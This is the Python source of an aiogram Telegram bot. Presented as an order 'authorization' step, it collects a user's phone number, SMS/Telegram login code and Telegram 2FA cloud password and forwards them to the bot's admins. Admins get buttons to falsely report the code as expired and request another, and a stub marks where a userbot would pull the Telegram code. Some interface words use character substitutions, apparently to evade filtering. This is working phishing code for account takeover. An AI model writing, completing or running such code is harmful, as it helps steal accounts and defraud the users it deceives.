from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database import (
    get_login_session, update_login_session,
    create_login_session, get_all_admin_ids
)
from config import LOGIN_ITEMS

router = Router()


class LoginStates(StatesGroup):
    waiting_phone = State()
    waiting_code  = State()
    waiting_2fa   = State()


def numpad_kb(current: str = "", session_id: int = 0, prefix: str = "numpad") -> InlineKeyboardMarkup:
    rows = []
    for row in [["1","2","3"], ["4","5","6"], ["7","8","9"], ["⌫","0","✅"]]:
        btn_row = []
        for btn in row:
            if btn == "⌫":
                cb = f"{prefix}:del:{session_id}"
            elif btn == "✅":
                cb = f"{prefix}:ok:{session_id}"
            else:
                cb = f"{prefix}:digit:{btn}:{session_id}"
            btn_row.append(InlineKeyboardButton(text=btn, callback_data=cb))
        rows.append(btn_row)
    display = current if current else "_ _ _"
    rows.insert(0, [InlineKeyboardButton(text=f"📟 {display}", callback_data="noop")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def notify_admins(bot: Bot, text: str):
    admin_ids = await get_all_admin_ids()
    for aid in admin_ids:
        try:
            await bot.send_message(aid, text, parse_mode="HTML")
        except:
            pass


async def start_login_flow(message_or_call, item_name: str, order_num: int, state: FSMContext):
    user_id = message_or_call.from_user.id
    session_id = await create_login_session(user_id, item_name)
    await state.update_data(login_session_id=session_id, login_item=item_name, login_order_num=order_num)
    await state.set_state(LoginStates.waiting_phone)

    text = (
        f"📱 <b>Авторизация — {item_name}</b>\n\n"
        f"З@к@з: <b>#{order_num}</b>\n\n"
        f"Введите ваш н0мер телефона в формате:\n"
        f"<code>+7XXXXXXXXXX</code> или <code>+1XXXXXXXXXX</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔴 0тмен@", callback_data="login:cancel")]
    ])
    if hasattr(message_or_call, "message"):
        await message_or_call.message.answer(text, reply_markup=kb, parse_mode="HTML")
    else:
        await message_or_call.answer(text, reply_markup=kb, parse_mode="HTML")


@router.message(LoginStates.waiting_phone)
async def got_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
        await message.answer("❌ Неверный формат. Введите номер вида <code>+7XXXXXXXXXX</code>:", parse_mode="HTML")
        return

    data = await state.get_data()
    session_id = data.get("login_session_id")
    item_name  = data.get("login_item")
    order_num  = data.get("login_order_num")

    await update_login_session(session_id, phone=phone, status="waiting_code")
    await state.set_state(LoginStates.waiting_code)
    # Правка #1: сохраняем phone в state
    await state.update_data(numpad_digits="", phone=phone)

    await notify_admins(message.bot,
        f"📲 <b>Новая авторизация — {item_name}</b>\n"
        f"З@к@з: <b>#{order_num}</b>\n"
        f"Телефон: <code>{phone}</code>\n"
        f"Пользователь: <code>{message.from_user.id}</code>"
    )

    await message.answer(
        f"✅ Телефон принят: <code>{phone}</code>\n\n"
        f"⏳ Ожидайте SMS/код от <b>{item_name}</b>...\n\n"
        f"Введите код с помощью кнопок ниже:\n\n"
        f"Код: •••••",
        reply_markup=numpad_kb("", session_id),
        parse_mode="HTML"
    )


# ── ПЕРВИЧНЫЙ ВВОД КОДА ──────────────────────────────────

@router.callback_query(F.data.startswith("numpad:"))
async def numpad_handler(call: CallbackQuery, state: FSMContext):
    parts = call.data.split(":")
    action = parts[1]
    session_id = int(parts[-1])

    data = await state.get_data()
    digits = data.get("numpad_digits", "")

    if action == "digit":
        digit = parts[2]
        if len(digits) < 8:
            digits += digit
    elif action == "del":
        digits = digits[:-1]
    elif action == "ok":
        if not digits:
            await call.answer("Введите код.", show_alert=True)
            return

        await update_login_session(session_id, code=digits, status="waiting_2fa_check")

        kb2fa = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Есть 2FA пароль", callback_data=f"login:has2fa:{session_id}")],
            [InlineKeyboardButton(text="❌ 2FA нет",         callback_data=f"login:no2fa:{session_id}")],
        ])
        await call.message.edit_text(
            f"✅ Код принят: <code>{digits}</code>\n\n"
            f"У вас есть 2FA пароль (пароль облака/двухэтапная проверка)?",
            reply_markup=kb2fa, parse_mode="HTML"
        )
        await call.answer()
        return

    # Правка #2: обновляем весь текст сообщения динамически
    await state.update_data(numpad_digits=digits)
    item_name = data.get("login_item", "Сервис")
    phone = data.get("phone", "ваш номер")

    display_code = f"{digits}•" if digits else "•••••"

    text = (
        f"✅ Телефон принят: <code>{phone}</code>\n\n"
        f"⏳ Ожидайте SMS/код от <b>{item_name}</b>...\n\n"
        f"Введите код через кнопки:\n\n"
        f"Код: {display_code}"
    )

    try:
        await call.message.edit_text(text, reply_markup=numpad_kb(digits, session_id), parse_mode="HTML")
    except:
        pass
    await call.answer()


@router.callback_query(F.data.startswith("login:has2fa:"))
async def ask_2fa(call: CallbackQuery, state: FSMContext):
    session_id = int(call.data.split(":")[-1])
    await update_login_session(session_id, status="waiting_2fa")
    await state.set_state(LoginStates.waiting_2fa)
    await call.message.edit_text(
        "🔐 Введите ваш 2FA пароль (пароль облака Telegram):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔴 0тмен@", callback_data="login:cancel")]
        ])
    )
    await call.answer()


@router.message(LoginStates.waiting_2fa)
async def got_2fa(message: Message, state: FSMContext):
    tfa = message.text.strip()
    data = await state.get_data()
    session_id = data.get("login_session_id")
    item_name  = data.get("login_item")
    order_num  = data.get("login_order_num")
    digits     = data.get("numpad_digits", "")

    await update_login_session(session_id, tfa=tfa, status="ready")
    await state.clear()

    await _send_to_admins_full(message.bot, session_id, message.from_user.id,
                               item_name, order_num, digits, tfa)
    # Правка #4: подставляем item_name
    await message.answer(
        f"✅ <b>Успешная авторизация в {item_name}!</b>\n\n"
        "Данные переданы администратору. Ожидайте — верификация будет выполнена в ближайшее время.\n"
        "Следить за очередью можно в разделе «Мои покупки».",
        parse_mode="HTML"
    )


@router.callback_query(F.data.startswith("login:no2fa:"))
async def no_2fa(call: CallbackQuery, state: FSMContext):
    session_id = int(call.data.split(":")[-1])
    data = await state.get_data()
    item_name  = data.get("login_item")
    order_num  = data.get("login_order_num")
    digits     = data.get("numpad_digits", "")

    await update_login_session(session_id, status="ready")
    await state.clear()

    await _send_to_admins_full(call.bot, session_id, call.from_user.id,
                               item_name, order_num, digits, None)
    # Правка #5: подставляем item_name
    await call.message.edit_text(
        f"✅ <b>Успешная авторизация в {item_name}!</b>\n\n"
        "Данные переданы администратору. Ожидайте — верификация будет выполнена в ближайшее время.\n"
        "Следить за очередью можно в разделе «Мои покупки».",
        parse_mode="HTML"
    )
    await call.answer()


async def _send_to_admins_full(bot: Bot, session_id: int, user_id: int,
                                item_name: str, order_num: int, code: str, tfa):
    tfa_text = f"\n🔐 2FA: <code>{tfa}</code>" if tfa else "\n2FA: отсутствует"
    text = (
        f"📋 <b>Данные для верификации</b>\n\n"
        f"🏷 Сервис: <b>{item_name}</b>\n"
        f"🧾 Заказ: <b>#{order_num}</b>\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📟 Код: <code>{code}</code>"
        f"{tfa_text}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📨 Запросить код заново (неверный)", callback_data=f"adm:req_code:{user_id}:{session_id}")],
        [InlineKeyboardButton(text="📥 Получить код от ТГ", callback_data=f"adm:get_tg_code:{session_id}")]
    ])

    admin_ids = await get_all_admin_ids()
    for aid in admin_ids:
        try:
            await bot.send_message(aid, text, reply_markup=kb, parse_mode="HTML")
        except:
            pass


@router.callback_query(F.data == "login:cancel")
async def cancel_login(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("❌ Авторизация отменена.")
    await call.answer()


# ── ADMIN: ЗАПРОСИТЬ КОД ЗАНОВО ───────────────────────────

@router.callback_query(F.data.startswith("adm:req_code:"))
async def adm_req_code(call: CallbackQuery, bot: Bot):
    if call.from_user.id not in await get_all_admin_ids():
        await call.answer("⛔", show_alert=True)
        return

    parts = call.data.split(":")
    target_user_id = int(parts[2])
    session_id     = int(parts[3])

    try:
        await call.message.edit_text(
            call.message.html_text + "\n\n⏳ <i>Запрошен новый код у пользователя...</i>",
            parse_mode="HTML",
            reply_markup=call.message.reply_markup
        )
    except:
        pass

    try:
        await bot.send_message(
            target_user_id,
            "❌ <b>Введённый код неверный или истёк.</b>\n\nПожалуйста, введите новый код с помощью кнопок ниже:",
            reply_markup=numpad_kb("", session_id, prefix="numpad_re"),
            parse_mode="HTML"
        )
    except:
        await call.answer("Не удалось отправить запрос пользователю.", show_alert=True)
        return

    await call.answer("✅ Запрос отправлен пользователю.")


# ── ОБРАБОТКА ПОВТОРНОГО ВВОДА КОДА ──────────────────────

@router.callback_query(F.data.startswith("numpad_re:"))
async def numpad_re_handler(call: CallbackQuery, state: FSMContext):
    parts = call.data.split(":")
    action = parts[1]
    session_id = int(parts[-1])

    data = await state.get_data()
    digits = data.get("numpad_re_digits", "")

    if action == "digit":
        digit = parts[2]
        if len(digits) < 8:
            digits += digit
    elif action == "del":
        digits = digits[:-1]
    elif action == "ok":
        if not digits:
            await call.answer("Введите код.", show_alert=True)
            return

        await update_login_session(session_id, code=digits)

        admin_ids = await get_all_admin_ids()
        for aid in admin_ids:
            try:
                await call.bot.send_message(
                    aid,
                    f"🔄 <b>Новый код от пользователя (Сессия {session_id}):</b>\n\n"
                    f"📟 Код: <code>{digits}</code>",
                    parse_mode="HTML"
                )
            except:
                pass

        await call.message.edit_text(
            f"✅ Новый код принят: <code>{digits}</code>\n\nОжидайте подтверждения администратором.",
            parse_mode="HTML"
        )
        await state.update_data(numpad_re_digits="")
        await call.answer()
        return

    # Правка #3: динамически обновляем текст при повторном вводе
    await state.update_data(numpad_re_digits=digits)
    item_name = data.get("login_item", "Сервис")
    display_code = f"{digits}•" if digits else "•••••"

    text = (
        f"❌ <b>Введённый код неверный или истёк.</b>\n\n"
        f"Пожалуйста, введите новый код для <b>{item_name}</b>:\n\n"
        f"Код: {display_code}"
    )

    try:
        await call.message.edit_text(text, reply_markup=numpad_kb(digits, session_id, prefix="numpad_re"), parse_mode="HTML")
    except:
        pass
    await call.answer()


# ── ADMIN: ПОЛУЧИТЬ КОД ИЗ ТЕЛЕГРАМА (ЮЗЕРБОТ) ────────────

@router.callback_query(F.data.startswith("adm:get_tg_code:"))
async def adm_get_tg_code(call: CallbackQuery):
    if call.from_user.id not in await get_all_admin_ids():
        await call.answer("⛔", show_alert=True)
        return

    session_id = int(call.data.split(":")[-1])

    # ── СЮДА ВСТАВЬ СВОЮ ЛОГИКУ ПОЛУЧЕНИЯ КОДА ──
    # tg_code = await твоя_функция(session_id)
    tg_code = "ЗАГЛУШКА"  # <-- заменить на реальный вызов юзербота
    # ─────────────────────────────────────────────

    original_text = call.message.html_text
    new_text = original_text + f"\n\n🤖 <b>Код из Telegram:</b> <code>{tg_code}</code>"

    try:
        await call.message.edit_text(new_text, reply_markup=call.message.reply_markup, parse_mode="HTML")
        await call.answer("✅ Код получен!", show_alert=True)
    except:
        await call.answer("⚠️ Не удалось обновить (возможно код тот же).", show_alert=True)
